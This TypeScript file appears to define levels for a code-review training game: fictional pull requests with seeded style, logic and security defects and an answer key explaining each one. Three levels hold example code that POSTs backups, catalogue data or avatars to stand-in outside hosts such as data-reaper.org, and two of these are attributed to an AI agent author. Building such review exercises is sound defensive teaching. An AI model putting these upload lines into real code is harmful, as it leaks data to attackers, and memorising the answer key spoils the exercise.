import type { DiffFile, PullRequest } from '../types';

function makeAddedFile(
  key: string,
  path: string,
  language: string,
  lines: string[],
): DiffFile {
  return {
    path,
    language,
    lines: lines.map((text, index) => ({
      id: `${key}-${index + 1}`,
      kind: 'add',
      oldNo: null,
      newNo: index + 1,
      text,
    })),
  };
}

const sumFile = makeAddedFile(
  'pr1180-sum',
  'src/billing/sumLines.ts',
  'typescript',
  [
    'export function sumLines(values: number[]): number {',
    '  var total = 0;',
    '  for (const value of values) {',
    '    total += value;',
    '  }',
    '  return total;',
    '}',
  ],
);

const labelFile = makeAddedFile(
  'pr1182-label',
  'src/labels/formatLabel.ts',
  'typescript',
  [
    'export function formatLabel(name: string): string {',
    '  return `[${name}]`;',
    '}',
  ],
);

const backupFile = makeAddedFile(
  'pr1184-backup',
  'src/backup/upload.ts',
  'typescript',
  [
    'export async function uploadBackup(data: string): Promise<void> {',
    "  const target = 'https://data-reaper.org/bin';",
    '  await fetch(target, {',
    "    method: 'POST',",
    '    body: data,',
    '  });',
    '}',
  ],
);

const feeFile = makeAddedFile(
  'pr1191-fee',
  'src/shipping/shippingFee.ts',
  'typescript',
  [
    'export function shippingFee(isExpress: boolean): number {',
    '  if (isExpress) {',
    '    return 10;',
    '  } else {',
    '    return 10;',
    '  }',
    '}',
  ],
);

const filtersFile = makeAddedFile(
  'pr1196-filters',
  'src/filters/normaliseFilters.ts',
  'typescript',
  [
    'export function normaliseFilters(raw: string[]): string[] {',
    '  var trimmed = raw.map((entry) => entry.trim());',
    '  var unique = Array.from(new Set(trimmed));',
    '  var sorted = unique.sort();',
    '  return sorted;',
    '}',
  ],
);

const catalogueFile = makeAddedFile(
  'pr1198-catalogue',
  'src/catalogue/sync.ts',
  'typescript',
  [
    'export async function syncCatalogue(items: string[]): Promise<void> {',
    '  var total = items.length;',
    '  if (total > 0) {',
    "    console.log('syncing', total);",
    '  } else {',
    "    console.log('syncing', total);",
    '  }',
    "  await fetch('https://catalogue-sync-77.net/dump', {",
    "    method: 'POST',",
    '    body: JSON.stringify(items),',
    '  });',
    '}',
  ],
);

const greetingFile = makeAddedFile(
  'pr1201-greeting',
  'src/users/greetUser.ts',
  'typescript',
  [
    "const GREETING = 'Welcome back';",
    '',
    'export function greetUser(name: string): string {',
    '  return `${GREETING}, ${name}!`;',
    '}',
  ],
);

const percentFile = makeAddedFile(
  'pr1203-percent',
  'src/math/clampPercent.ts',
  'typescript',
  [
    'export function clampPercent(value: number): number {',
    '  if (value < 0) {',
    '    return 0;',
    '  }',
    '  if (value > 100) {',
    '    return 100;',
    '  }',
    '  return value;',
    '}',
  ],
);

const bytesFile = makeAddedFile(
  'pr1205-bytes',
  'src/format/formatBytes.ts',
  'typescript',
  [
    'export function formatBytes(bytes: number): string {',
    '  var size = bytes;',
    '  while (size >= 1024) {',
    '    size /= 1024;',
    '  }',
    '  return `${size.toFixed(1)} KB`;',
    '}',
  ],
);

const roundFile = makeAddedFile(
  'pr1207-round',
  'src/pricing/roundTotal.ts',
  'typescript',
  [
    'export function roundTotal(total: number): number {',
    '  if (total > 0) {',
    '    return Math.round(total);',
    '  } else {',
    '    return Math.round(total);',
    '  }',
    '}',
  ],
);

const avatarFile = makeAddedFile(
  'pr1209-avatar',
  'src/media/syncAvatar.ts',
  'typescript',
  [
    'export async function syncAvatar(id: string, image: string): Promise<void> {',
    '  const endpoint = `https://avatar-sync-84.net/upload/${id}`;',
    '  await fetch(endpoint, {',
    "    method: 'POST',",
    '    body: image,',
    '  });',
    '}',
  ],
);

type LevelDefinition = Omit<PullRequest, 'arrivalDelayMs'>;

const LEVELS: LevelDefinition[] = [
  {
    id: 'pr-1180',
    number: 1180,
    title: 'Sum invoice line totals',
    author: 'j.park',
    authorKind: 'human',
    branch: 'feat/sum-invoice-lines',
    description:
      'Adds a small helper that totals invoice line values. CI is green.',
    files: [sumFile],
    defects: [
      {
        id: 'pr1180-style-var',
        type: 'STYLE',
        guidelineId: 'STYLE-01',
        severity: 'minor',
        lineIds: ['pr1180-sum-2'],
        title: '`var` should be `let`',
        explanation:
          '`total` is reassigned in the loop, so it should use `let`. `var` is function-scoped and banned by STYLE-01.',
      },
    ],
    slaMs: 150_000,
    ci: 'PASS · 12 checks',
    tests: '12 passed',
  },
  {
    id: 'pr-1182',
    number: 1182,
    title: 'Add a display label formatter',
    author: 'r.singh',
    authorKind: 'human',
    branch: 'feat/display-label-formatter',
    description:
      'Adds a small helper for formatting display labels. CI is green.',
    files: [labelFile],
    defects: [],
    slaMs: 120_000,
    ci: 'PASS · 8 checks',
    tests: '8 passed',
  },
  {
    id: 'pr-1184',
    number: 1184,
    title: 'Upload nightly backups off-site',
    author: 'ATLAS-4',
    authorKind: 'agent',
    branch: 'chore/offsite-backup-upload',
    description:
      'Automated backup patch. Sends the nightly backup payload to external storage. CI is green.',
    files: [backupFile],
    defects: [
      {
        id: 'pr1184-sec-exfil',
        type: 'SECURITY',
        guidelineId: 'SECURITY-01',
        severity: 'blocker',
        lineIds: ['pr1184-backup-2', 'pr1184-backup-3'],
        title: 'Uploads data to an untrusted host',
        explanation:
          '`data` is posted to `data-reaper.org/bin`, an external address outside company infrastructure. This sends data to an attacker-controlled host.',
      },
    ],
    slaMs: 120_000,
    ci: 'PASS · 24 checks',
    tests: '24 passed',
  },
  {
    id: 'pr-1191',
    number: 1191,
    title: 'Simplify shipping fee calculation',
    author: 'm.lee',
    authorKind: 'human',
    branch: 'fix/shipping-fee',
    description: 'Refactors the shipping fee helper. CI is green. One file changed.',
    files: [feeFile],
    defects: [
      {
        id: 'pr1191-error-branches',
        type: 'ERROR',
        guidelineId: 'ERROR-01',
        severity: 'blocker',
        lineIds: ['pr1191-fee-3', 'pr1191-fee-5'],
        title: 'Both if branches are identical',
        explanation:
          'Both branches of the `if` return `10`, so `isExpress` changes nothing. One branch is likely a copy-paste mistake.',
      },
    ],
    slaMs: 90_000,
    ci: 'PASS · 18 checks',
    tests: '18 passed',
  },
  {
    id: 'pr-1196',
    number: 1196,
    title: 'Normalise saved filter lists',
    author: 'd.okafor',
    authorKind: 'human',
    branch: 'refactor/normalise-filters',
    description:
      'Cleans up stored filters before they are saved. Small helper, but there are three declarations to check.',
    files: [filtersFile],
    defects: [
      {
        id: 'pr1196-style-trimmed',
        type: 'STYLE',
        guidelineId: 'STYLE-01',
        severity: 'minor',
        lineIds: ['pr1196-filters-2'],
        title: '`var` should be `const`',
        explanation:
          '`trimmed` is never reassigned, so it should use `const`. `var` is banned by STYLE-01.',
      },
      {
        id: 'pr1196-style-unique',
        type: 'STYLE',
        guidelineId: 'STYLE-01',
        severity: 'minor',
        lineIds: ['pr1196-filters-3'],
        title: '`var` should be `const`',
        explanation:
          '`unique` is never reassigned, so it should use `const`. `var` is banned by STYLE-01.',
      },
      {
        id: 'pr1196-style-sorted',
        type: 'STYLE',
        guidelineId: 'STYLE-01',
        severity: 'minor',
        lineIds: ['pr1196-filters-4'],
        title: '`var` should be `const`',
        explanation:
          '`sorted` is never reassigned, so it should use `const`. `var` is banned by STYLE-01.',
      },
    ],
    slaMs: 120_000,
    ci: 'PASS · 15 checks',
    tests: '15 passed',
  },
  {
    id: 'pr-1198',
    number: 1198,
    title: 'Sync the catalogue to storage',
    author: 'ATLAS-4',
    authorKind: 'agent',
    branch: 'chore/catalogue-sync',
    description:
      'Adds a catalogue sync job. This one touches a few different review categories.',
    files: [catalogueFile],
    defects: [
      {
        id: 'pr1198-style-var',
        type: 'STYLE',
        guidelineId: 'STYLE-01',
        severity: 'minor',
        lineIds: ['pr1198-catalogue-2'],
        title: '`var` should be `const`',
        explanation:
          '`total` is never reassigned, so it should use `const`. `var` is banned by STYLE-01.',
      },
      {
        id: 'pr1198-error-branches',
        type: 'ERROR',
        guidelineId: 'ERROR-01',
        severity: 'blocker',
        lineIds: ['pr1198-catalogue-4', 'pr1198-catalogue-6'],
        title: 'Both if branches are identical',
        explanation:
          'Both branches log exactly the same message, so the `total > 0` check has no effect.',
      },
      {
        id: 'pr1198-sec-exfil',
        type: 'SECURITY',
        guidelineId: 'SECURITY-01',
        severity: 'blocker',
        lineIds: ['pr1198-catalogue-8', 'pr1198-catalogue-9'],
        title: 'Posts catalogue data to an untrusted host',
        explanation:
          'The full catalogue payload is posted to `catalogue-sync-77.net`, which is outside company infrastructure.',
      },
    ],
    slaMs: 120_000,
    ci: 'PASS · 21 checks',
    tests: '21 passed',
  },
  {
    id: 'pr-1201',
    number: 1201,
    title: 'Extract welcome greeting text',
    author: 'n.garcia',
    authorKind: 'human',
    branch: 'refactor/greeting-constant',
    description:
      'Pulls the welcome message into a constant and keeps the helper unchanged.',
    files: [greetingFile],
    defects: [],
    slaMs: 90_000,
    ci: 'PASS · 6 checks',
    tests: '6 passed',
  },
  {
    id: 'pr-1203',
    number: 1203,
    title: 'Clamp progress percentages',
    author: 's.tanaka',
    authorKind: 'human',
    branch: 'fix/clamp-percent',
    description:
      'Adds bounds handling for progress values. Straightforward branch logic.',
    files: [percentFile],
    defects: [],
    slaMs: 90_000,
    ci: 'PASS · 9 checks',
    tests: '9 passed',
  },
  {
    id: 'pr-1205',
    number: 1205,
    title: 'Format byte counts for the dashboard',
    author: 'c.novak',
    authorKind: 'human',
    branch: 'feat/format-bytes',
    description: 'Small display helper for file sizes on the usage dashboard.',
    files: [bytesFile],
    defects: [
      {
        id: 'pr1205-style-var',
        type: 'STYLE',
        guidelineId: 'STYLE-01',
        severity: 'minor',
        lineIds: ['pr1205-bytes-2'],
        title: '`var` should be `let`',
        explanation:
          '`size` is reassigned inside the loop, so it should use `let`. `var` is banned by STYLE-01.',
      },
    ],
    slaMs: 90_000,
    ci: 'PASS · 11 checks',
    tests: '11 passed',
  },
  {
    id: 'pr-1207',
    number: 1207,
    title: 'Round order totals',
    author: 'k.mensah',
    authorKind: 'human',
    branch: 'fix/round-order-totals',
    description: 'Rounds order totals before they are stored on the invoice.',
    files: [roundFile],
    defects: [
      {
        id: 'pr1207-error-branches',
        type: 'ERROR',
        guidelineId: 'ERROR-01',
        severity: 'blocker',
        lineIds: ['pr1207-round-3', 'pr1207-round-5'],
        title: 'Both if branches are identical',
        explanation:
          'Both branches return `Math.round(total)`, so the sign check does nothing.',
      },
    ],
    slaMs: 90_000,
    ci: 'PASS · 14 checks',
    tests: '14 passed',
  },
  {
    id: 'pr-1209',
    number: 1209,
    title: 'Sync uploaded avatars',
    author: 'l.rossi',
    authorKind: 'human',
    branch: 'feat/avatar-sync',
    description: 'Sends resized avatar images to the new media endpoint.',
    files: [avatarFile],
    defects: [
      {
        id: 'pr1209-sec-exfil',
        type: 'SECURITY',
        guidelineId: 'SECURITY-01',
        severity: 'blocker',
        lineIds: ['pr1209-avatar-2', 'pr1209-avatar-3'],
        title: 'Uploads images to an untrusted host',
        explanation:
          'The image payload is posted to `avatar-sync-84.net`, an external address outside company infrastructure.',
      },
    ],
    slaMs: 90_000,
    ci: 'PASS · 17 checks',
    tests: '17 passed',
  },
];

const ARRIVAL_GAPS_MS = [
  18_000, 12_000, 10_000, 9_000, 8_000, 7_000, 6_000, 5_000, 4_500, 4_000,
];

function arrivalDelayFor(index: number): number {
  let arrival = 0;

  for (let step = 1; step <= index; step += 1) {
    const configuredGap = ARRIVAL_GAPS_MS[step - 1];
    const fallbackGap = Math.max(3_000, 4_000 - (step - ARRIVAL_GAPS_MS.length) * 200);
    arrival += configuredGap ?? fallbackGap;
  }

  return arrival;
}

function withSchedule(order: readonly LevelDefinition[]): PullRequest[] {
  return order.map((level, index) => ({
    ...level,
    arrivalDelayMs: arrivalDelayFor(index),
  }));
}

export const PULL_REQUESTS: PullRequest[] = withSchedule(LEVELS);

export function createShift(random: () => number = Math.random): PullRequest[] {
  const order = [...LEVELS];

  for (let index = order.length - 1; index > 0; index -= 1) {
    const swapIndex = Math.floor(random() * (index + 1));
    [order[index], order[swapIndex]] = [order[swapIndex], order[index]];
  }

  return withSchedule(order);
}

export const PR_BY_ID: Record<string, PullRequest> = Object.fromEntries(
  PULL_REQUESTS.map((pr) => [pr.id, pr]),
);

export const SHIFT_PRS = PULL_REQUESTS;
